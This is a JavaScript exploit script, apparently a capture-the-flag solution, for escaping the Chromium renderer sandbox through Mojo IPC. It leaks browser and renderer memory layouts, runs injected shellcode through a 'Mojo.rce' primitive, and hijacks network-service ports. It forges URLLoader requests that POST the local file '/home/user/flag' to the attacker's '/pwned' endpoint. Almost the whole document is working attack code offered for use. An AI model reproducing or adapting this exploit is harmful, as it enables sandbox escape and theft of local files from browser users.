var HOST = location.origin;
class Name {
  constructor(v1, v2) {
    this.v1 = v1;
    this.v2 = v2;
  }
  equal(n) {
    return this.v1 === n.v1 && this.v2 === n.v2;
  }
}
class Port {
  constructor(status, nodename, name, next_seq) {
    this.status = status;
    this.nodename = nodename;
    this.name = name;
    this.next_seq = next_seq; //uint64_t next_sequence_num_to_send;
  }
  equal(p) {
    return this.nodename.equal(p.nodename) && this.name.equal(p.name);
  }
}
class Node {
  constructor(name, addr, controller, core) {
    this.name = name;
    this.addr = addr;
    this.core = core;
    this.ports = [];
    this.controller = controller;
  }
}
Uint8Array.prototype.replace = function (placeholder, val) {
  let dw = new DataView(this.buffer);
  for (let i = 0; i < this.byteLength - 8; i++)
    if (this[i] == placeholder) {
      let found = true;
      for (let j = i; found && j < i + 8; j++)
        if (this[j] != placeholder) found = false;
      if (!found) continue;
      dw.setBigUint64(i, val, true);
    }
};
console.log = () => { };
async function main() {
  var p = new content.mojom.PwnPtr();
  Mojo.bindInterface(
    content.mojom.Pwn.name,
    mojo.makeRequest(p).handle,
    "process"
  );
  window.p = p;
  var pptr = (await p.this()).val;
  console.log("[+] p @ 0x" + pptr.toString(16));
  var vtptr = (await p.ptrAt(pptr)).val;
  console.log("[+] vtptr @ 0x" + vtptr.toString(16));
  var chromeBase = (await p.ptrAt(vtptr)).val - 0x1800n;
  console.log("[+] chromeBase @ 0x" + chromeBase.toString(16));
  async function leakBrowser(p, chromeBase) {
    var browserNode;
    console.log("[+] leaking browser process's IPC");
    var gcore = (await p.ptrAt(chromeBase + 0x7a41c30n)).val;
    console.log("[+] g_core @ 0x" + gcore.toString(16));
    var node_controller = (await p.ptrAt(gcore + 0x30n)).val;
    console.log("[+] node_controller_ @ 0x" + node_controller.toString(16));
    var node = (await p.ptrAt(node_controller + 0x28n)).val;
    console.log("[+] node @ 0x" + node.toString(16));
    browserNode = new Node(
      new Name((await p.ptrAt(node)).val, (await p.ptrAt(node + 0x8n)).val),
      node,
      node_controller,
      gcore
    );
    console.log(
      "           nodename: " +
      browserNode.name.v1.toString(16) +
      " " +
      browserNode.name.v2.toString(16)
    );
    var bucket_list = (await p.ptrAt(node + 0x48n)).val;
    var bucket_count = (await p.ptrAt(node + 0x50n)).val;
    var beginptr = (await p.ptrAt(node + 0x58n)).val;
    var element_count = (await p.ptrAt(node + 0x60n)).val;
    console.log("[+] bucket_list @ 0x" + bucket_list.toString(16));
    console.log("[i] bucket count: " + bucket_count);
    console.log("[i] element count: " + element_count);

    let eleidx = 0;
    while (beginptr != 0n) {
      port_addr = (await p.ptrAt(beginptr + 0x20n)).val;

      beginptr = (await p.ptrAt(beginptr)).val;
      port_status = (await p.ptrAt(port_addr)).val & 0xffffffffn;
      nodename = new Name(
        (await p.ptrAt(port_addr + 0x8n)).val,
        (await p.ptrAt(port_addr + 0x10n)).val
      );
      portname = new Name(
        (await p.ptrAt(port_addr + 0x18n)).val,
        (await p.ptrAt(port_addr + 0x20n)).val
      );
      next_seq = (await p.ptrAt(port_addr + 0x28n)).val;
      port = new Port(port_status, nodename, portname, next_seq);
      eleidx++;
      browserNode.ports.push(port);
    }
    console.log("[i] Found " + eleidx + " ports in browser process");
    return browserNode;
  }
  var browserNodeBefore = await leakBrowser(p, chromeBase);
  var leaksc = new Uint8Array(new Uint8Array(await fetch("/leakptr.bin").then((response) => response.arrayBuffer())));
  var rendererChromeBase = 0n;
  {
    let sc = new ArrayBuffer(leaksc.byteLength + 0x108);
    let u8 = new Uint8Array(sc);
    for (let i = 0; i < leaksc.byteLength; i++) {
      u8[i] = leaksc[i];
    }
    Mojo.rce(sc);
    let dw = new DataView(sc);
    let leakptr = dw.getBigUint64(0x100, true);
    console.log("[+] leakptr: 0x" + leakptr.toString(16));
    rendererChromeBase = leakptr - 0x63ab322n;
    console.log(
      "[+] rendererChromeBase @ 0x" + rendererChromeBase.toString(16)
    );
  }
  window.rendererChromeBase = rendererChromeBase;
  var readsc = new Uint8Array(new Uint8Array(await fetch("/memread.bin").then((response) => response.arrayBuffer())));
  var readPtr = (addr) => {
    var sc = new ArrayBuffer(readsc.byteLength + 0x108);
    var u8 = new Uint8Array(sc);
    let dw = new DataView(sc);
    for (let i = 0; i < readsc.byteLength; i++) {
      u8[i] = readsc[i];
    }
    u8.replace(0x41, addr);
    Mojo.rce(sc);
    return dw.getBigUint64(0x100, true);
  };
  window.readPtr = readPtr;
  var rendererNode;
  {
    var gcore = readPtr(rendererChromeBase + 0x7a41c30n);
    console.log("[+] g_core @ 0x" + gcore.toString(16));
    var node_controller = readPtr(gcore + 0x30n);
    console.log("[+] node_controller @ 0x" + node_controller.toString(16));
    var node = readPtr(node_controller + 0x28n);
    console.log("[+] node @ 0x" + node.toString(16));
    rendererNode = new Node(
      new Name(readPtr(node), readPtr(node + 0x8n)),
      node,
      node_controller,
      gcore
    );
    console.log(
      "           nodename: " +
      rendererNode.name.v1.toString(16) +
      " " +
      rendererNode.name.v2.toString(16)
    );
    if (true) {
      var bucket_list = readPtr(node + 0x48n);
      var bucket_count = readPtr(node + 0x50n);
      var beginptr = readPtr(node + 0x58n);
      var element_count = readPtr(node + 0x60n);
      console.log("[+] bucket_list @ 0x" + bucket_list.toString(16));
      console.log("[i] bucket count: " + bucket_count);
      console.log("[i] element count: " + element_count);
      while (beginptr != 0n) {
        port_addr = readPtr(beginptr + 0x20n);
        beginptr = readPtr(beginptr);
        port_status = readPtr(port_addr) & 0xffffffffn;
        nodename = new Name(
          readPtr(port_addr + 0x8n),
          readPtr(port_addr + 0x10n)
        );
        portname = new Name(
          readPtr(port_addr + 0x18n),
          readPtr(port_addr + 0x20n)
        );
        next_seq = readPtr(port_addr + 0x28n);
        port = new Port(port_status, nodename, portname, next_seq);
        /*
					   console.log('[+] found port @ 0x'+port_addr.toString(16));
					   console.log('          status  : '+port_status);
					   console.log('          nodename: '+port.nodename.v1.toString(16)+' '+port.nodename.v2.toString(16));
					   console.log('          portname: '+port.name.v1.toString(16)+' '+port.name.v2.toString(16));
					 */
        rendererNode.ports.push(port);
      }
    }
  }
  for (let i = 0; i < 0x10; i++) {
    var frame = document.createElement("iframe");
    frame.src = "/iframe";
    document.body.appendChild(frame);
  }
  setTimeout(async () => {
    var browserNode = await leakBrowser(p, chromeBase);
    var peers = [];
    if (true) {
      console.log("[+] Leaking controller's peers ");
      let bucket_list = readPtr(rendererNode.controller + 0x60n);
      let beginptr = readPtr(rendererNode.controller + 0x70n);
      let element_count = readPtr(rendererNode.controller + 0x78n);
      console.log("bucket_list @ 0x" + bucket_list.toString(16));
      console.log("element_count: " + element_count);
      while (beginptr != 0n) {
        peer_addr = readPtr(beginptr + 0x20n);
        beginptr = readPtr(beginptr);
        console.log("peer @ 0x" + peer_addr.toString(16));
        remote_name = new Name(
          readPtr(peer_addr + 0x58n),
          readPtr(peer_addr + 0x60n)
        );
        console.log(
          "     remote name: " +
          remote_name.v1.toString(16) +
          " " +
          remote_name.v2.toString(16) +
          (remote_name.equal(browserNode.name) ? "(browser)" : "") +
          (remote_name.equal(rendererNode.name) ? "(local)" : "")
        );
        if (
          !remote_name.equal(browserNode.name) &&
          !remote_name.equal(rendererNode.name)
        )
          peers.push(remote_name);
      }
    }
    var peerportcount = new Array(peers.length).fill(0);
    for (let p of browserNode.ports) {
      for (let i = 0; i < peers.length; i++)
        if (p.nodename.equal(peers[i])) peerportcount[i]++;
    }
    var targetidx = 0;
    for (let i = 1; i < peers.length; i++)
      if (peerportcount[i] > peerportcount[targetidx]) targetidx = i;
    var targetnode = peers[targetidx]; // Network Service
    console.log("target node: " + targetnode.v1.toString(16) + ' ' + targetnode.v2.toString(16))
    var potentials = Array.from(browserNode.ports).filter((p) => {
      if (p.status <= 0n || p.status > 3n) return false;
      if (p.next_seq != 2) return false;
      if (!p.nodename.equal(targetnode)) return false;
      for (let po of rendererNode.ports) if (po.equal(p)) return false;
      for (let po of browserNodeBefore.ports) if (po.equal(p)) return false;
      return true;
    })//.sort(()=>Math.random()-0.5);
    // for (let i = 0; i < potentials.length; i++) {
    //   let port = potentials[i];
    //   console.log(
    //     "          nodename: " +
    //       port.nodename.v1.toString(16) +
    //       " " +
    //       port.nodename.v2.toString(16)
    //   );
    //   console.log(
    //     "          portname: " +
    //       port.name.v1.toString(16) +
    //       " " +
    //       port.name.v2.toString(16)
    //   );
    //   console.log("");
    // }
    console.log("[+] potentials count:" + potentials.length);
    window.potentials = potentials;
    var portinitsc = new Uint8Array(new Uint8Array(await fetch("/portinit.bin").then((response) => response.arrayBuffer())));
    var initPort = (port) => {
      let sc = new Uint8Array(portinitsc.byteLength);
      for (let i = 0; i < sc.byteLength; i++) sc[i] = portinitsc[i];
      sc.replace(0x41, rendererNode.addr);
      sc.replace(0x42, rendererChromeBase + 0x408f5f0n);
      sc.replace(0x43, rendererChromeBase + 0x152b80n);
      sc.replace(0x45, rendererChromeBase + 0x408f900n);
      sc.replace(0x46, rendererNode.core);
      sc.replace(0x47, rendererChromeBase + 0xa47240n);
      sc.replace(0x48, port.nodename.v1);
      sc.replace(0x49, port.nodename.v2);
      sc.replace(0x4a, port.name.v1);
      sc.replace(0x4b, port.name.v2);
      Mojo.rce(sc.buffer);
      let dv = new DataView(sc.buffer);
      let portref = dv.getBigUint64(sc.byteLength - 0x28 - 0x8 - 0x4, true);
      let handle = dv.getUint32(sc.byteLength - 0x28 - 0x4, true);
      console.log("port mojo handle = " + handle);
      console.log("portref @ 0x" + portref.toString(16));
      port.portref = portref;
      port.handle = handle;
    };

    var basesendmsgsc = new Uint8Array(await fetch("/sendmsg.bin").then((response) => response.arrayBuffer()));
    basesendmsgsc.replace(0x41, rendererNode.core);
    basesendmsgsc.replace(0x42, rendererChromeBase + 0xa4f920n);
    basesendmsgsc.replace(0x43, rendererChromeBase + 0xa482c0n);
    basesendmsgsc.replace(0x44, rendererChromeBase + 0xa4f980n);
    basesendmsgsc.replace(0x45, rendererChromeBase + 0xa4f8c0n);
    console.log("Sending message in 3");
    function sendPort(p, dry_send) {
      initPort(p);
      var kURLLoaderFactory_CreateLoaderAndStart_Name = 1854314169;
      var kURLLoaderFactory_Clone_Name = 2066939000;

      var loader = new network.mojom.URLLoaderPtr();
      p.loader = loader;
      var client = new network.mojom.URLLoaderClientPtr();

      Mojo.bindInterface(
        network.mojom.URLLoaderClient.name,
        mojo.makeRequest(client).handle,
        "process"
      );

      var req = new network.mojom.URLRequest();
      req.method = "POST";
      req.url = new url.mojom.Url({ "url": HOST + "/pwned" });
      req.referrer = new url.mojom.Url({ "url": HOST });
      req.mode = 1; //kNoCors
      req.headers = new network.mojom.HttpRequestHeaders();
      req.corsExemptHeaders = new network.mojom.HttpRequestHeaders();
      req.corsExemptHeaders.headers = [];
      req.headers.headers = [new network.mojom.HttpRequestHeaderKeyValuePair({ 'key': 'X-AAAAAA', 'value': 'BBBBBB' })];
      req.siteForCookies = new network.mojom.SiteForCookies({ 'scheme': 'https', 'registrableDomain': '' });
      req.fetchIntegrity = "";
      var reqbody = new network.mojom.URLRequestBody()
      reqbody.elements = [
        new network.mojom.DataElement({
          'type': 4, //kFile
          'path': new mojoBase.mojom.FilePath({ 'path': '/home/user/flag' }),
          'buf': new Uint8Array([0x42, 0x42]),
          'file': null,
          'length': 1337,
          'blobUuid': '',
          'expectedModificationTime': new mojoBase.mojom.Time()
        })
      ];
      reqbody.identifier = 0x1337;
      req.requestBody = reqbody;
      var URLLoaderFactory_CreateLoaderAndStart_Params =
        network.mojom.URLLoaderFactory.fuzzMethods.createLoaderAndStart
          .params;
      var params = new URLLoaderFactory_CreateLoaderAndStart_Params();
      params.loader = mojo.makeRequest(loader);
      params.routingId = 1337;
      params.requestId = 1337;
      params.options = 0;
      params.request = req;
      params.client = client;
      params.trafficAnnotation = new network.mojom.MutableNetworkTrafficAnnotationTag();
      var codec = mojo.internal;
      var builder = new codec.MessageV0Builder(
        kURLLoaderFactory_CreateLoaderAndStart_Name,
        codec.align(URLLoaderFactory_CreateLoaderAndStart_Params.encodedSize)
      );
      builder.encodeStruct(
        URLLoaderFactory_CreateLoaderAndStart_Params,
        params
      );
      var message = builder.finish();

      var sendmsgsc = new Uint8Array(
        basesendmsgsc.byteLength + message.buffer.arrayBuffer.byteLength
      );
      for (let i = 0; i < basesendmsgsc.byteLength; i++) {
        sendmsgsc[i] = basesendmsgsc[i];
      }
      var u8msg = new Uint8Array(message.buffer.arrayBuffer);
      for (let i = (!!dry_send ? 1 : 0); i < u8msg.byteLength; i++) {
        sendmsgsc[i + basesendmsgsc.byteLength] = u8msg[i];
      }
      var scdv = new DataView(sendmsgsc.buffer);
      var port_addr = readPtr(p.portref + 0x10n);
      console.log("port @ 0x" + port_addr.toString(16));
      scdv.setUint32(
        basesendmsgsc.byteLength - 4 - 4 - 8,
        p.handle + 4,
        true
      );
      scdv.setUint32(
        basesendmsgsc.byteLength - 4 - 4 - 4,
        p.handle + 1,
        true
      );
      scdv.setUint32(
        basesendmsgsc.byteLength - 4,
        message.buffer.arrayBuffer.byteLength,
        true
      );
      scdv.setUint32(
        basesendmsgsc.byteLength - 8,
        p.handle,
        true
      );
      scdv.setBigUint64(
        basesendmsgsc.byteLength - 24,
        p.next_seq,
        true
      )
      Mojo.rce(sendmsgsc.buffer);
    }
    let i = 0;
    for (i = 0; i < potentials.length; i++) {
      console.log("Sending " + i);
      console.log("seq: ", potentials[i].next_seq)
      sendPort(potentials[i], false);
      i++;
    }
    console.log("[i] Sent to all potential ports");
  }, 3000);
}
